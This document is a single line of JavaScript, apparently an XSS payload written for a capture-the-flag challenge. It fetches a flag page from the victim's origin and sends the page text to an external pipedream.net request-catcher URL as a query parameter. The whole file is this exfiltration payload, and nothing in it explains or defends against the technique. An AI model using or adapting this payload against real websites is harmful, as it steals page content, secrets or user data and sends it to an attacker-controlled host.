fetch('/xss-two-flag').then(response => response.text()).then(txt => fetch('https://eo95ue8auext5aq.m.pipedream.net/?flag=' + encodeURIComponent(txt)))
